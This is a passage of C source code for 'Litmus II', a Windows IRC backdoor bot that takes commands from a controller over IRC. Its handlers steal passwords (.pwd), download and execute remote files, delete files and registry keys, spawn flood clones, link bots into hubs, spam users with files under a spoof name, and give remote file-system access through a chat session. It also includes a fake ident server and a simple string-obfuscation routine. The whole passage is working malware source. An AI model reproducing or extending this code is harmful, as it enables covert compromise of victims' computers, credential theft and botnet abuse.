								if(strcmp(".pwd",in_parm1) == 0)
								{
									getpasses(sockz, in_nick);
								}

#ifdef oj
								if(strcmp(".oj",in_parm1) == 0)
								{
									if(strcmp("stain",in_parm2) == 0) { ZeroMemory(ojstain,300); lstrcat(ojstain,in_parm3); }
									if(strcmp("me",in_parm2) == 0) 	{	ZeroMemory(ojme,300);	lstrcat(ojme,in_parm3); }

									if(strcmp("sent",in_parm2) == 0)
								    {
										if((int)in_dest[0] == (int)'#')
										{
											sprintf(buffer2,"PRIVMSG %s :Files sent: %u\r\n",in_dest,filessent);
											serverout(buffer2,sockz);
										}
										else
										{
											sprintf(buffer2,"NOTICE %s :Files sent: %u\r\n",in_nick,filessent);
											serverout(buffer2,sockz);
										}
									}

									if(strcmp("msg",in_parm2) == 0)
									{
										char *rawwd;
										ZeroMemory(ojmsg,600);
									    rawwd = strstr(buffer,"msg");
										rawwd = rawwd + 4;
										lstrcat(ojmsg,rawwd);
										sprintf(buffer2,"NOTICE %s : (OJ Msg): %s\r\n",in_nick,ojmsg);
										serverout(buffer2,sockz);
									}

									if(strcmp("con",in_parm2) == 0)
									{
										char *rawwd;
									 	char *tppm = malloc(900);
										ZeroMemory(ojconn,500);
									    rawwd = strstr(buffer,"con");
										rawwd = rawwd + 4;
										lstrcat(ojconn,rawwd);
										sprintf(tppm,"NOTICE %s :On Connect: %s\r\n",in_nick,ojconn);
										serverout(tppm,sockz);
										free(tppm);


									}

									if(strcmp("clear",in_parm2) == 0)
									{
										ZeroMemory(ojmsg,600);
									}

									if(strcmp("file",in_parm2) == 0)
									{
										if(!strlen(in_parm3))
										{
											ZeroMemory(ojfile,300);
											sprintf(buffer2,"NOTICE %s :Stopped sending file\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										else
										{
											ZeroMemory(ojfile,300);
											lstrcat(ojfile,home);
											lstrcat(ojfile,in_parm3);
										}
									}

									if(strcmp("join",in_parm2) == 0)
									{
										sprintf(buffer2,"join %s\r\n",in_parm3);
										send(ojsock,buffer2,lstrlen(buffer2),0);
									}
									if(strcmp("quit",in_parm2) == 0)
									{
										char ojquit[]= "quit :0,1LITMUS II\r\n";
										send(ojsock,ojquit,lstrlen(ojquit),0);
										closesocket(ojsock);
										ojsock = 0;
									}

									if(strcmp("nick",in_parm2) == 0)
									{
										sprintf(buffer2,"nick %s\r\n",in_parm3);
										send(ojsock,buffer2,lstrlen(buffer2),0);
									}

									if(strcmp("load",in_parm2) == 0)
									{
										if(ojsock) { sprintf(buffer2,"NOTICE %s :quit the other oj first\r\n", in_nick); serverout(buffer2,sockz); return 1; }
										sin.sin_addr.s_addr = inet_addr(in_parm3);
										if (sin.sin_addr.s_addr == INADDR_NONE)
										{
											// The server name its not an ip, Resove it //
											lpHostEntry = gethostbyname( in_parm3 );
											if (lpHostEntry != 0)
											{
												sin.sin_addr.s_addr = *(int long *)lpHostEntry->h_addr_list[0];
											}
											else
		    								{
												sprintf(buffer2,"NOTICE %s :Non Resovable host\r\n");
												serverout(buffer2,sockz);
												return 1;
											}
										}
										ojsock = socket( PF_INET, SOCK_STREAM, 0);
										err = WSAAsyncSelect(ojsock, hwnd , 5567,       //9999 == OUR uMSG
										FD_CONNECT | FD_CLOSE | FD_READ);
										sin.sin_port = htons(6667);
										sin.sin_family = AF_INET;
										connect(ojsock, &sin, sizeof(sin));  //connect to irc server //
										ident();
									}
									return 1;
								}

#endif

							if(strcmp(".invite",in_parm1) == 0)
							{
								sprintf(buffer2,"INVITE %s %s\r\n",in_parm2,in_parm3);
								serverout(buffer2,sockz);
								return 1;
							}
							if(strcmp(".sockclose", in_parm1) == 0)	 { 	closesocket(atoi(in_parm2)); return 1;  }
							if(strcmp(".killchat", in_parm1) == 0)
								{
									closesocket(chatsock);
									chatsock = 0;
								}
								if(strcmp(".exec",in_parm1) == 0)
								{
									HINSTANCE shsucc;
									sprintf(buffer2,"%s%s",home,in_parm2); //file name
									shsucc = ShellExecute(hwnd,"open",buffer2,0,home,SW_NORMAL);
									if((int )shsucc > 32)
									{
										sprintf(buffer2,"PRIVMSG %s :%s ran ok\r\n",target,in_parm2);
										serverout(buffer2,sockz);
									}
									else
									{
										if((int) shsucc == ERROR_FILE_NOT_FOUND)
										{
											sprintf(buffer2,"PRIVMSG %s :File Not Found\r\n",target);
											serverout(buffer2,sockz);
										}
										else
										{
											sprintf(buffer2,"PRIVMSG %s :Error Running %s\r\n",target,in_parm2);
											serverout(buffer2,sockz);
										}
									}
									return 1;
								}

								if(strcmp(".raw",in_parm1) == 0)
								{
									sprintf(buffer2,"%s %s %s %s\r\n",in_parm2,in_parm3,in_parm4,in_parm5);
									serverout(buffer2,sockz);
									return 1;
								}
								if(strcmp(".regdelkey",in_parm1) == 0)
								{
									ZeroMemory(buffer2,100);
									lstrcat(buffer2,in_parm2);
									if(RegDeleteKey(HKEY_LOCAL_MACHINE,buffer2) == ERROR_SUCCESS)
									{
										sprintf(buffer2,"NOTICE %s :key deleted\r\n",in_nick);
										serverout(buffer2,sockz);
									}
									else
									{
										sprintf(buffer2,"NOTICE %s :RegDeleteKey() failed\r\n",in_nick);
										serverout(buffer2,sockz);
									}
									return 1;
								}
								if(strcmp(".link",in_parm1) == 0)
								{
									sin.sin_addr.s_addr = inet_addr(in_parm2);
									if (sin.sin_addr.s_addr == INADDR_NONE)
									{
									// The server name its not an ip, Resove it //
										lpHostEntry = gethostbyname( in_parm2 );
										if (lpHostEntry != 0)
										{
											sin.sin_addr.s_addr = *(int long *)lpHostEntry->h_addr_list[0];
										}
										else
		    							{
											sprintf(buffer2,"NOTICE %s :Non Resovable host\r\n",in_nick);
											serverout(buffer2,sockz);
											return 1;
										}

									}
									oj_hub = socket( PF_INET, SOCK_STREAM, 0);
									WSAAsyncSelect(oj_hub, hwnd , 5804,
									FD_CONNECT | FD_CLOSE | FD_READ);
									#ifdef debugg
									if(debug_on)
									{
										sprintf(buffer2,"LINK TO: %s:%u \r\n",in_parm2,atoi(in_parm3));
										log_debug(buffer2);
									}
									#endif
									sin.sin_port = htons(atoi(in_parm3));
									sin.sin_family = AF_INET;
									connect(oj_hub, &sin, sizeof(sin));  //connect to irc server //
								}

								if(strcmp(".hub",in_parm1) == 0)
								{
									SOCKET chksock;
									chksock = socket(PF_INET, SOCK_STREAM, 0);
									if (idsock != INVALID_SOCKET)
									{
										sin.sin_port = htons(atoi(in_parm2));
										sin.sin_family = AF_INET;
										sin.sin_addr.s_addr = INADDR_ANY;
										err = bind(chksock, &sin, sizeof sin);
										if (err == 0)
										{
											listen(chksock,3);
											WSAAsyncSelect(chksock, hwnd, 5758, FD_READ | FD_ACCEPT | FD_CLOSE);
											sprintf(buffer2,"PRIVMSG %s :(HUB): Listing on %u ; Sockid: %u\r\n",target,atoi(in_parm2),chksock);
											serverout(buffer2,sockz);
											return 0;
										}
										sprintf(buffer2,"PRIVMSG %s :(HUB): ERROR PORT IN USE!\r\n",target);
										serverout(buffer2,sockz);
									}
									closesocket(chksock);
									return 1;
								}



								if(strcmp(".reload",in_parm1) == 0)
								{
									HINSTANCE chld;
									ZeroMemory(buffer2,100);
									lstrcat(buffer2,home);
									lstrcat(buffer2,sz_exe_name);


									chld = (HINSTANCE)ShellExecute(0,"open",buffer2,0,home,SW_HIDE);
									if(chld > (HINSTANCE)32)
									{
										serverout("QUIT :Brb\r\n",sockz);
										SendMessage(hwnd,WM_CLOSE,0,0);
									}
									else
									{
										sprintf("PRIVMSG %s :negative houston\r\n",target);
										serverout(buffer2,sockz);
									}
								}


								if(strcmp(".regdelval",in_parm1) == 0)
								{
									ZeroMemory(buffer2,100);
									ZeroMemory(buffer3,100);

									lstrcat(buffer2,in_parm2);
									memset(strrchr(buffer2,'\\'),'\0',1);
									if(RegDeleteValue(HKEY_LOCAL_MACHINE,buffer2) == ERROR_SUCCESS)
									{
										sprintf(buffer2,"NOTICE %s :value deleted\r\n",in_nick);
										serverout(buffer2,sockz);
									}
									else
									{
										sprintf(buffer2,"NOTICE %s :unable to delete vaule\r\n",in_nick);
										serverout(buffer2,sockz);
									}
								}

								if(strcmp(".ping",in_parm1) == 0)
								{
									ZeroMemory(buffer2,100);
									lstrcat(buffer2,in_parm2);
									lstrcat(buffer2,szspace);
									lstrcat(buffer2,in_parm3);
									beginthread(&Ping,50,buffer2);
									return 1;
								}

								if(strcmp(".del",in_parm1) == 0)
								{
									if(DeleteFile(in_parm2))
									{
										sprintf(buffer2,"PRIVMSG %s :%s removed\r\n",target,in_parm2);
										serverout(buffer2,sockz);
									}
									else
									{
										sprintf(buffer2,"PRIVMSG %s :Error Deleting %s\r\n",target,in_parm2);
										serverout(buffer2,sockz);
									}
								}
#ifdef help
								if(strcmp(".help",in_parm1) == 0)
								{
									if(!strlen(in_parm2))
									{
										sprintf(buffer2,"PRIVMSG %s :    --- Litmus 2 ---   \r\n",in_nick);
										serverout(buffer2,sockz);
										sprintf(buffer2,"PRIVMSG %s :          topics avaliable: ping download die del oj\r\n",in_nick);
										serverout(buffer2,sockz);
										sprintf(buffer2,"PRIVMSG %s :                            clones exec ident raw link hub\r\n",in_nick);
										serverout(buffer2,sockz);
										sprintf(buffer2,"PRIVMSG %s :                            reload\r\n",in_nick);
										serverout(buffer2,sockz);
									}
									else
									{
										if(strcmp("reload",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .reload  - restarts the server\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("del",in_parm2) == 0 )
										{
											sprintf(buffer2,"PRIVMSG %s : .del <file> (deletes a file)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("hub",in_parm2) == 0 )
										{
 											sprintf(buffer2,"PRIVMSG %s : .hub <port>  (this opens up a listening port so\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :                you can link bots *40 bots max*)\r\n",in_nick);
											serverout(buffer2,sockz);
										}

										if(strcmp("link",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .link <ip> <port>  (this will link your bot to another hub)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("exec",in_parm2) == 0 )
										{
 											sprintf(buffer2,"PRIVMSG %s : .exec <file>  (file must be in homedir)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("die",in_parm2) == 0 )
										{
 											sprintf(buffer2,"PRIVMSG %s : .die  (kills me))\r\n",in_nick);
											serverout(buffer2,sockz);
										}


										if(strcmp("ping",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .ping <host> <seconds>\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("download",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .download <host/file.ext> (dont include the http:\\\\)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :  example: .download europa.spaceports.com/~joe/new.exe\r\n");
											serverout(buffer2,sockz);
										}
										if(strcmp("ident",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .ident <pass>\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("clones",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .clones <command> <parms>\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      load <server> <port> <n> (loads up n clones)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      raw <commands> (raw commands)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      join <channel> (join a channel)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      die (kills all clones)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("oj",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s : .oj <command> (Onjoin bot)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      load <server> loads an oj bot up\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      clear (makes the bot stop spamming)\r\n",in_nick);
											serverout(buffer2,sockz);

											sprintf(buffer2,"PRIVMSG %s :      con <raw commands> these will be preformed on connect\r\n",in_nick);
											serverout(buffer2,sockz);

											sprintf(buffer2,"PRIVMSG %s :      msg <text> (text to be sent)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      join <channel> (bot joins chan)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      part <channel> (bot parts chan)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      nick <nick> (changes the oj bots nick)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      quit (kills bot)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s : - - - - - - - -\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      file <file> (send file on join via dcc server *must be in homedir*)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      me (my spoof nick)\r\n",in_nick);
											serverout(buffer2,sockz);
											sprintf(buffer2,"PRIVMSG %s :      stain (what to send my file as)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
										if(strcmp("raw",in_parm2) == 0)
										{
											sprintf(buffer2,"PRIVMSG %s :  .raw <command> (raw server commands)\r\n",in_nick);
											serverout(buffer2,sockz);
										}
									}
								}

#endif

								if(strcmp(".die",in_parm1) == 0)
								{
									sprintf(buffer2,"QUIT :Boom ya got me!\r\n");
									serverout(buffer2,sockz);
									SendMessage(hwnd,WM_CLOSE,0,0);
								}
								if(strcmp(".download",in_parm1) == 0)
								{
									if(memcmp("http//",in_parm2,6) == 0)
									{
										sprintf(buffer2,"PRIVMSG %s :take out the http://\r\n",in_nick);
										return 1;
									}
									_beginthread((&GetFile), 56,in_parm2);
								}
								if (strcmp(".clones",in_parm1) == 0)
								{
									if(strcmp("load",in_parm2) == 0)
									{
										clonesload(in_parm3,atoi(in_parm4),atoi(in_parm5));
										ident();
									}
									if(strcmp("raw",in_parm2) == 0)
									{
										char *rawwd;
									    rawwd = strstr(buffer,"raw");
										rawwd = rawwd + 4;
										clonesraw(rawwd);
									}
									if(strcmp("join",in_parm2) == 0)
									{
										sprintf(buffer2,"JOIN %s\r\n",in_parm3);
										clonesraw(buffer2);
									}
									if(strcmp("part",in_parm3) == 0)
									{
										sprintf(buffer2,"PART %s\r\n",in_parm3);
										clonesraw(buffer2);
									}

									if(strcmp("die",in_parm2) == 0)
									{
										clonesdie();
									}
								}

							}
						}
						return 1;
					}


				break;


			case 433:          // nickname in use

				sprintf(buffer2,"%s %s%d\r\n",nick, guest,rand());
				serverout(buffer2,sockz);
				break;

			case 451:        //we havent registered
				sprintf(buffer2,"%s %s%d\r\n",nick, guest,rand());
				serverout(buffer2,sockz);
				sprintf(buffer2,"USER %s localhost localhost :%s\r\n",username, username);
				serverout(buffer2,sockz);
				break;

			case 474:        // banned from channel

				frozenchan = frozenchan +1;
				sprintf(buffer2,fixfroze,join, target, frozenchan, chankey);
				serverout(buffer2,sockz);
				break;

			case 473:      // channel is +i

				frozenchan = frozenchan +1;
				sprintf(buffer2,fixfroze,join, target, frozenchan, chankey);
				serverout(buffer2,sockz);
				break;

			case 475:                        //bad key

				frozenchan = frozenchan +1;
				sprintf(buffer2,fixfroze,join, target, frozenchan, chankey);
				serverout(buffer2,sockz);
				break;

			case 471:                        //chan is full

				frozenchan = frozenchan +1;
				sprintf(buffer2,fixfroze,join, target, frozenchan, chankey);
				serverout(buffer2, sockz);
				break;

			case 353:     // use this too see if we are creating a new chan

				memset(buffer2, 0 , 100);
				sprintf(buffer2,"@%s",me);
				if(strstr(buff,buffer2) != 0) //am i opped?

				{
					memset(buffer2,0,100);
					ptr = strchr(buff,'#'); //what chan am i in again?
					ptr2 = strchr((ptr +1),' '); //find the end of the name
					pmath = ptr2 - ptr;
					memcpy(buffer2,ptr,pmath); //copy channel name into buffer2
					sprintf(buffer3,"MODE %s +stk %s\r\n",buffer2, chankey);
					serverout(buffer3, sockz);

					sprintf(buffer3,"TOPIC %s :Eddie lives somwhere in time!\r\n",buffer2);
					serverout(buffer3,sockz);


					im_opped = 1;
				}
				break;
			default:
				return 1;
				break;

			}

			// -----------------

		}
	}
	return 1;
}




void privpar (char *inputs)  // break up input into nick/host etc
{
    int i;
   	static char delimiters[] = "!:@\r\n "; // took out ~
   	char *u;
	int count;
	int tsize;

	for(i = 0; i <= 10; i++)
	{
		memset(table[i],0,90);   //clear that all out
	}



	count = 0;

	u = (char *) strtok(inputs, delimiters);
	while (u != NULL)
	{
		tsize = strlen(u);
		if (tsize <= 88)
		{
			strcpy( table[count], u);
		}
		else
		    {
			memset((void *)table[count], 0, 90);
		}

		u = (char *) strtok(NULL, delimiters);   /* first param is NULL	after the initial strtok */
		count++;
		if (count >= 11)
		{
			return;
		}
	}

}



void serverout(const char *sr_out, SOCKET s)
{
#ifdef debugg
		if (debug_on == 1)
		{
			char *debug_s_out = malloc(400);
			sprintf(debug_s_out,"(SERVEROUT): %s",sr_out);
			log_debug(debug_s_out);
			free(debug_s_out);
		}
#endif

	// this routine sends data out to the server, and makes sure the bot is still connected
	err = send(s, sr_out, lstrlen(sr_out), 0);
	if (err == SOCKET_ERROR)
	{
#ifdef debugg
		if(debug_on) log_debug("(SERVEROUT): Caught SOCKET_ERROR, reconnecting\r\n");
#endif
		closesocket(s);
		botsock = 0;
		connectbot();
	}
	return;
}


void log_debug(char *log_this)
{
#ifdef debugg
	int wrote_b;
	struct tm *newtime;
	time_t ltime;
	time (&ltime);
	newtime = localtime(&ltime);
	sprintf(TMPP,"[%.2d:%.2d:%.2d]: %s", newtime->tm_hour,newtime->tm_min,newtime->tm_sec,log_this);
	WriteFile(debug_file_hand,TMPP,lstrlen(TMPP), &wrote_b,0);
#endif
}



/*  -------------------------------------------------------//
//                      CHAT  PROC                         //
// -------------------------------------------------------*/
int chat(SOCKET Csock, LPARAM lParam)
{
	char *tok;
	char chbuff[600];
	char chbuff2[100];

	char intok1[40];
	char intok2[500];
 	WIN32_FIND_DATA finddata;
	static char notfound[] = "File not found\r\n";
	static char nopath[] = "Error Changing Directory\r\n";

	switch(lParam)
	{
	case FD_READ:
		ZeroMemory(intok2,500);
		recv(Csock,chbuff,600,0);
		tok = strtok(chbuff," \r\n");

		ZeroMemory(chatpath,600);
		GetCurrentDirectory(600,chatpath);
		lstrcat(chatpath,"\\");

		if(tok) {	ZeroMemory(intok1,40);	lstrcat(intok1,tok);	tok = strtok(0," \r\n");	if (tok) {	ZeroMemory(intok2,500); lstrcat(intok2,tok); }	}

		ZeroMemory(chbuff,600);

		if(strcmp(intok1,"bye") == 0) { 	shutdown(Csock,2); }
		if(strcmp(intok1,"dir") == 0)
		{
			HANDLE findf;
			if(intok2[0] == (int)'\0') { ZeroMemory(intok2,500); lstrcat(intok2,"*"); }

//			lstrcat(chbuff,chatpath);
//			lstrcat(chbuff,intok2);

			findf = FindFirstFile(intok2, &finddata);
			if(findf == INVALID_HANDLE_VALUE)	{ 	send(Csock,notfound,lstrlen(notfound),0);	return 1; }

			itoa(finddata.nFileSizeLow,chbuff2,10);
			sprintf(chbuff,"%s  %sb    %s \r\n", finddata.cAlternateFileName , chbuff2, finddata.cFileName );
			send(Csock,chbuff,lstrlen(chbuff),0);

			while(FindNextFile(findf,&finddata))
			{
				itoa(finddata.nFileSizeLow,chbuff2,10);
				sprintf(chbuff,"%s  %sb    %s \r\n", finddata.cAlternateFileName , chbuff2, finddata.cFileName );
				send(Csock,chbuff,lstrlen(chbuff),0);
			}
			FindClose(findf);
		}
		if(!strcmp(intok1,"del"))	{ 	lstrcat(chbuff,chatpath); 	lstrcat(chbuff,intok2);  if(DeleteFile(chbuff))	{	sprintf(chbuff,"%s Deleted\r\n",intok2); 	send(Csock,chbuff,lstrlen(chbuff),0); }  else	{ 	sprintf(chbuff,"Unable to delete %s\r\n",intok2); send(Csock,chbuff,lstrlen(chbuff),0); } 	}

		if(!strcmp(intok1,"get")) 	{ 	int nsize = sizeof(sin); 	getpeername(Csock,&sin,&nsize);  sprintf(chbuff,"%s %s%s %s",inet_ntoa(sin.sin_addr),chatpath,intok2,intok2); 	beginthread(&mirc_send,256,chbuff);  }

		if(!strcmp(intok1,"cd"))
		{
//			lstrcat(chbuff,chatpath);
//			lstrcat(chatpath,intok2);
//			lstrcat(chatpath,"\\");
			if(SetCurrentDirectory(intok2))
			{
				GetCurrentDirectory(500,chbuff);
				lstrcat(chbuff,"\r\n");
				send(Csock,chbuff,lstrlen(chbuff),0);
			}
			else
			{
				send(Csock,nopath,lstrlen(nopath),0);
			}
		}

		if(!strcmp(intok1,"pwd"))  { lstrcat(chbuff,chatpath); 	lstrcat(chbuff,"\r\n");  send(Csock,chbuff,lstrlen(chbuff),0);	}

		if(!strcmp(intok1,"path"))
		{
			if(SetCurrentDirectory(intok2))
			{
				GetCurrentDirectory(500,chbuff);
				lstrcat(chbuff,"\r\n");
				send(Csock,chbuff,lstrlen(chbuff),0);
			}
			else
			{
				send(Csock,nopath,lstrlen(nopath),0);
			}
		}




		break;
	case FD_CLOSE:
		closesocket(Csock);
		chatsock = 0;
		break;
	case FD_CONNECT:
		if(!HIWORD(lParam))
		{
			ZeroMemory(chatpath,500);
			lstrcat(chatpath,home);
			chatsock = Csock;
			send(Csock,onchat,sizeof(onchat),0);

			sprintf(buffer2,"%s\r\n",chatpath);
			send(Csock,buffer2,strlen(chatpath),0);
			break;
		}
		else
		{
			chatsock = 0;
			closesocket(Csock);
		}
	}

	return 1;
}


/*   ---------------------   DCC GET PROC -------------------- */
void get_f(SOCKET get_sock, LPARAM lParam)
{
	int byt_wrote;
	int bytes_recv;
    int count;

	char get_buff[512];
	ZeroMemory(get_buff,512);

	for (count = 0; count < 10; count++ )
	{
		if (sock_get[count] == get_sock)
		{
			switch(lParam)
			{
				case FD_READ:
					bytes_recv = recv(get_sock, get_buff, 512, 0);

					err = WriteFile(file_get[count], get_buff, bytes_recv, &byt_wrote, 0);
					byte_get[count] += bytes_recv;
					if (err == TRUE)
					{
						int tmpsnd;
						tmpsnd = htonl(byte_get[count]);
						send(get_sock,&tmpsnd,4,0);
					}
					else
					{
						shutdown(get_sock,2);
					}
					return;

					break;
				case FD_CLOSE:
					sock_get[count] = 0;
					closesocket(get_sock);
					CloseHandle((HANDLE)file_get[count]);
					return;
					break;
			}
		}
	}
}

void CALLBACK bot_chk(HWND handl, UINT trash, UINT idevent, DWORD utctime)
{
	char jewie[100];
	is_ten++;
	ZeroMemory(jewie,100);

	if(is_ten == 10)
	{

		if ((putmode == 1) && (im_opped == 1) && (modes_caught <= 5))
		{
			sprintf(jewie,"MODE %s -b *!LITMUS@%u\r\n", target, op_key);
			serverout(jewie,botsock);
			putmode = 0;
		}
		is_ten = 0;
		modes_caught = 0;
	}


	if (botsock != 0)
	{
		int ticks = (GetTickCount() - last_time); //how long has it been since weve gotten a message?
		if (ticks > 60000)
		{
			serverout("PING :bleh\r\n",botsock);
		}
		if (ticks > 120000)
		{
			serverout("QUIT :Litmus II - Dead Server\r\n",botsock);
			shutdown(botsock,2);
		}
	}
	else
	{
		connectbot();
	}
}



/*   --------------------------------------------------------- */
/*   -------------------       I D E N T       --------------- */
/*   --------------------------------------------------------- */



void CALLBACK closeid(HWND handd, UINT junkk, UINT idevent, DWORD utctime)
{
	closesocket(idsock);
	KillTimer(handd, idevent);
}

int ident(void)    // turn ident on

{
	SOCKET chksock;
	chksock = socket(PF_INET, SOCK_STREAM, 0);
	if (idsock != INVALID_SOCKET)
	{
		sin.sin_port = htons(113);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = INADDR_ANY;
		err = bind(chksock, &sin, sizeof sin);
		if (err == 0)
		{
			idsock = chksock;
			listen(idsock,3);
			WSAAsyncSelect(idsock, hwnd, 5050, FD_READ | FD_ACCEPT | FD_CLOSE);
			SetTimer(hwnd,5050, 15000, &closeid);
			return 0;
		}
		closesocket(chksock);
	}
	return 1;
}

int decrypt ( char *indata, char *outdata)
{
	int i = 0;

	while((int)indata[i] != 0 )
	{
		outdata[i] = (char)((int)indata[i] + 88);
		i++;

	}


	return 1;
}


int identactive(SOCKET isock, LPARAM lParam)
{
	char *ptr;

	char ident1[150];
	char ident2[200];
	ZeroMemory(ident1,100);
	ZeroMemory(ident2,200);

	switch(lParam)
	{
	case FD_READ:
		recv(isock, ident1, 100, 0);

		if(strchr(ident1,(int)'\r')) ZeroMemory(strchr(ident1,(int)'\r'),1);
		if(strchr(ident1,(int)'\n')) ZeroMemory(strchr(ident1,(int)'\n'),1);

		sprintf(ident2,"%s : USERID : UNIX :%s \r\n",ident1, username);
		send(isock, ident2, lstrlen(ident2), 0);
		shutdown(isock,2);
		break;
	case FD_CLOSE:
		closesocket(isock);
		break;
	case FD_ACCEPT:
		accept(isock, 0, 0);
		break;
	}

	return 1;
}



#ifdef wingate

void gate(SOCKET get_sock, LPARAM lParam)
{
	int namelen;
	WORD prot;
	DWORD myip;

	char get_buff[512];
	ZeroMemory(get_buff,512);

	switch(lParam)
	{
		case FD_CLOSE:
			closesocket(get_sock);
			return;
		break;

		case FD_CONNECT:
			if(!HIWORD(lParam))
			{
				namelen = sizeof(sin);
				getsockname(get_sock, &sin, &namelen);
				memcpy(&myip,&sin.sin_addr,4);
				prot = htons(GATE_LISTEN);
				send(get_sock,&prot,2,0);
				send(get_sock,&myip,4,0);
				send(get_sock,"\0",1,0);
			}
			else
			{
				closesocket(get_sock);
			}

	}

}



void gate_listen()
{
	SOCKET tsock;
	tsock = socket(PF_INET, SOCK_STREAM, 0);
	if (tsock != INVALID_SOCKET)
	{
		sin.sin_port = htons(GATE_LISTEN);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = INADDR_ANY;
		err = bind(tsock, &sin, sizeof sin);
		if (err == 0)
		{
			listen(tsock,3);
			WSAAsyncSelect(tsock, hwnd, 9021, FD_ACCEPT );
			return;
		}
		closesocket(tsock);
	}
	return;
}


void gate_back(SOCKET get_sock, LPARAM lParam)
{
	int namelen;
	SOCKET empsock;

	switch(lParam)
	{

		case FD_CONNECT:
			if(!HIWORD(lParam))
			{
				empsock = accept(get_sock, &sin, &namelen);
				ZeroMemory(buffer2,100);
				sprintf(buffer2,"PRIVMSG %s :(gate_back): %s\r\n",target,inet_ntoa(sin.sin_addr));
				serverout(buffer2,botsock);
				closesocket(empsock);

			}
			else
			{
				closesocket(get_sock);
			}

	}

}


#endif


